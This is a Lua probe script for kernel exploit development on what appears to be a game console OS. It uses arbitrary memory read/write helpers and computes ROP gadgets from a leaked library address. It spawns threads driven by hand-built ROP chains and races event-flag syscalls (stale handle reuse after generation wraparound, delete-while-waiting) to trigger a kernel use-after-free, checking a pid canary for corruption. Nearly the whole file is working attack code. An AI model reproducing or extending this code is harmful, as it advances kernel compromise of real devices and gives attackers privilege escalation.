-- CRASH_CLASS: HIGH
-- PROBE 100a: EVF handle race — stale alias + delete-under-wait + realloc
--
-- EVF handles wrap generation after 8 churns → byte-identical stale alias.
-- Delete-under-wait wakes the waiter (mask=0). This probe tests:
-- (A) Stale handle wait on reallocated object (does 542 attach to new EVF?)
-- (B) Delete-while-waiting → churn 8 → create new → set → does old waiter see it?
-- (C) Tight race: child wait vs main delete on same handle simultaneously
-- (D) Multi-waiter delete stress: 4 waiters, delete, immediate churn+create

print("=== PROBE 100a: EVF HANDLE RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function wb(a,v) pcall(function() memory.write_byte(a,uint64(v)) end) end
local function hx(v)
    if v==nil then return "nil" end
    return string.format("0x%X",v)
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430)
local sc538=mk(538); local sc539=mk(539); local sc542=mk(542)
local sc543=mk(543); local sc544=mk(544)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

-- 6 child slots for waiters
local SLOTS=6
local STK_PG=2; local PG_PER=STK_PG+1
local TOTAL_PG=4+SLOTS*PG_PER
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)

local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl20=R+0x20; wq(sl20,uint64(0)); wq(sl20+8,uint64(20000000))
local sl50=R+0x40; wq(sl50,uint64(0)); wq(sl50+8,uint64(50000000))
local sl200=R+0x60; wq(sl200,uint64(0)); wq(sl200+8,uint64(200000000))
local tb=R+0x80

-- Result pages: one per child slot
local RESULT_BASE=R+0x1000  -- 6 result dwords at +0, +8, +16...
local EXIT_BASE=R+0x1100    -- 6 exit markers

-- EVF name buffer
local NAME=R+0x1200
local function put_name(s)
    for i=1,#s do wb(NAME+i-1,string.byte(s,i)) end
    wb(NAME+#s,0)
end

local function child_stk(i) return R+0x4000*(4+i*PG_PER) end
local function child_ctx(i) return R+0x4000*(4+i*PG_PER+STK_PG) end
local function result_addr(i) return RESULT_BASE+i*8 end
local function exit_addr(i) return EXIT_BASE+i*8 end

local function setup_ctx(slot, rax, rdi, rsi, rdx, r10, r8)
    local ctx=child_ctx(slot)
    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(child_stk(slot)))
    wq(ctx+_AX,uint64(rax))
    wq(ctx+_DI,uint64(rdi))
    wq(ctx+_SI,uint64(rsi))
    wq(ctx+_DX,uint64(rdx or 0))
    wq(ctx+_R10,uint64(r10 or 0))
    wq(ctx+_R8,uint64(r8 or 0))
end

local function spawn_child(slot, stk_chain)
    local stk=child_stk(slot)
    local ctx=child_ctx(slot)
    local off=0
    for _,v in ipairs(stk_chain) do
        wq(stk+off, v); off=off+8
    end
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx), uint64(tb), uint64(0)) end)
    return rq(tb)
end

-- EVF helpers (main thread)
local function evf_create(name, init)
    put_name(name)
    local ok,rv=pcall(function() return sc538(uint64(NAME),uint64(init or 0),uint64(0)) end)
    if ok and rv then return N(rv) end
    return nil
end
local function evf_delete(h)
    local ok,rv=pcall(function() return sc539(uint64(h)) end)
    return ok and N(rv) or nil
end
local function evf_set(h, bits)
    local ok,rv=pcall(function() return sc544(uint64(h),uint64(bits)) end)
    return ok and N(rv) or nil
end
local function evf_poll(h, bits, mode)
    local ok,rv=pcall(function() return sc543(uint64(h),uint64(bits),uint64(mode)) end)
    return ok and N(rv) or nil
end

-- Spawn waiter child: 542(handle, bits, mode, result_addr, timeout) → thr_exit
local function spawn_waiter(slot, handle, bits, mode, timeout_addr)
    local ra=result_addr(slot)
    local ea=exit_addr(slot)
    wd(ra, 0xDEADBEEF)  -- sentinel in result
    wq(ea, uint64(0))   -- exit marker = 0

    -- Context: first syscall = 542(handle, bits, mode, result, timeout)
    setup_ctx(slot, 542, handle, bits, mode, ra, timeout_addr or 0)

    -- After wait returns: thr_exit(exit_marker_addr) — writes 1 to marker
    spawn_child(slot, {
        PRDI, uint64(ea),
        PRAX, uint64(431), SA,
        -- safety tail
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })
end

-- Churn: create+delete N times to advance generation
local function churn(n, name)
    for _=1,n do
        local h=evf_create(name or "churn", 0)
        if h then evf_delete(h) end
    end
end

print(string.format("region=0x%X", R))

-- ============================================================
print("")
print("--- A: STALE HANDLE WAIT ON REALLOCATED OBJECT ---")
-- 1. Create EVF_A (H), set bit 1
-- 2. Delete EVF_A + churn 7 → generation wraps
-- 3. Create EVF_B → gets same H
-- 4. Set bit 1 on EVF_B
-- 5. Child: 542(H, 1, 1, result, timeout=200ms)
-- 6. Does child see bit 1? result should change from DEADBEEF → 1
-- ============================================================

local hA = evf_create("race_a", 0)
print(string.format("  A created: H=%s", hx(hA)))
if hA then
    evf_delete(hA)
    churn(7, "race_a")
    local hB = evf_create("race_a", 0)
    print(string.format("  B created after 8 churns: H=%s (expect same as A)", hx(hB)))

    if hB then
        evf_set(hB, 1)
        -- Child waits with the ORIGINAL handle value (=hA, which now = hB)
        spawn_waiter(0, hA, 1, 1, sl200)
        native.fcall_with_rax(stub,240,sl50,0)

        local r=rd(result_addr(0))
        local e=rd(exit_addr(0))
        print(string.format("  result=0x%X (expect 1) exit=%d", r or 0, e or 0))
        print(string.format("  %s", r==1 and "STALE HANDLE DROVE WAIT ON NEW OBJECT" or
            r==0xDEADBEEF and "wait didn't fire (handle rejected)" or
            "unexpected result"))
        evf_delete(hB)
    end
end

-- ============================================================
print("")
print("--- B: DELETE-WHILE-WAITING + CHURN + CREATE + SET ---")
-- 1. Create EVF (H), bit 1 clear
-- 2. Child waits for bit 1 (blocks, no timeout)
-- 3. Delete H → wakes child (mask=0), child exits
-- 4. Churn 7 + create new EVF (same H)
-- 5. Set bit 1 on new EVF
-- 6. Check: did child see bit 1 from new EVF? (should NOT — clean detach)
-- ============================================================

local hC = evf_create("race_b", 0)
print(string.format("  created: H=%s", hx(hC)))
if hC then
    -- Child waits for bit 1 with NO timeout (NULL) — will block
    spawn_waiter(1, hC, 1, 1, 0)
    native.fcall_with_rax(stub,240,sl20,0)  -- let child enter wait

    -- Delete → should wake child with mask=0
    local dv=evf_delete(hC)
    print(string.format("  delete rv=%s", hx(dv)))

    native.fcall_with_rax(stub,240,sl20,0)  -- let child process wake

    local r1=rd(result_addr(1))
    local e1=rd(exit_addr(1))
    print(string.format("  after delete: result=0x%X exit=%d", r1 or 0, e1 or 0))

    -- Now churn 7 + create new + set
    churn(7, "race_b")
    local hD = evf_create("race_b", 0)
    print(string.format("  new EVF after churn: H=%s", hx(hD)))
    if hD then
        evf_set(hD, 1)
        native.fcall_with_rax(stub,240,sl50,0)

        local r1b=rd(result_addr(1))
        local e1b=rd(exit_addr(1))
        print(string.format("  after set on new: result=0x%X exit=%d", r1b or 0, e1b or 0))
        print(string.format("  %s", r1b==1 and "!!WAITER INHERITED BY NEW OBJECT!!" or
            "waiter properly detached (safe)"))
        evf_delete(hD)
    end
end

-- ============================================================
print("")
print("--- C: TIGHT RACE — child wait vs main delete (no gap) ---")
-- 1. Create EVF (H), bit 1 set
-- 2. Spawn child: wait(H, 2, 1, result, NULL) — waits for bit 2 (not set)
-- 3. IMMEDIATELY delete H from main thread (no sleep between spawn and delete)
-- 4. The race: child enters kernel 542 while main enters kernel 539
-- 5. If child attaches to object AFTER delete started freeing → UAF
-- ============================================================

for test=0,4 do
    local hE = evf_create("race_c", 1)  -- bit 1 set but child waits for bit 2
    if not hE then
        print(string.format("C[%d]: create failed", test))
    else
        spawn_waiter(2, hE, 2, 1, 0)  -- wait for bit 2, no timeout

        -- NO DELAY — delete immediately to race with child's wait entry
        local dv=evf_delete(hE)

        native.fcall_with_rax(stub,240,sl50,0)  -- let dust settle

        local r=rd(result_addr(2))
        local e=rd(exit_addr(2))
        local c=N(native.fcall_with_rax(stub,20))

        print(string.format("C[%d]: H=%s del=%s result=0x%X exit=%d pid=%d%s",
            test, hx(hE), hx(dv), r or 0, e or 0, c,
            c~=pid and " !!CANARY" or ""))

        if c~=pid then
            print("CANARY FAILURE!")
            break
        end
    end
end

-- ============================================================
print("")
print("--- D: 4 WAITERS + DELETE + IMMEDIATE CHURN+CREATE ---")
-- 1. Create EVF (H)
-- 2. Spawn 4 children all waiting for bit 2 (no timeout)
-- 3. Delete H → all should wake (mask=0)
-- 4. IMMEDIATELY create new EVF on same slot (churn 7 + create)
-- 5. Set bit 2 on new EVF
-- 6. Check: did any old waiter see the new object's bit?
-- ============================================================

local hF = evf_create("race_d", 1)
print(string.format("  created: H=%s", hx(hF)))
if hF then
    -- 4 waiters on slots 2-5, all wait for bit 2
    for s=2,5 do
        spawn_waiter(s, hF, 2, 1, 0)
    end
    native.fcall_with_rax(stub,240,sl20,0)  -- let all enter wait

    -- Delete — should wake all 4
    evf_delete(hF)

    -- IMMEDIATELY churn + create new
    churn(7, "race_d")
    local hG = evf_create("race_d", 0)
    if hG then
        evf_set(hG, 2)  -- set bit 2 on new object
    end

    native.fcall_with_rax(stub,240,sl50,0)

    for s=2,5 do
        local r=rd(result_addr(s))
        local e=rd(exit_addr(s))
        print(string.format("  slot %d: result=0x%X exit=%d%s",
            s, r or 0, e or 0,
            r==2 and " !!INHERITED!!" or ""))
    end

    local c=N(native.fcall_with_rax(stub,20))
    print(string.format("  canary=%d%s", c, c~=pid and " !!FAIL" or " OK"))
    if hG then evf_delete(hG) end
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "!!FAIL="..fc))
print("=== 100a COMPLETE ===")
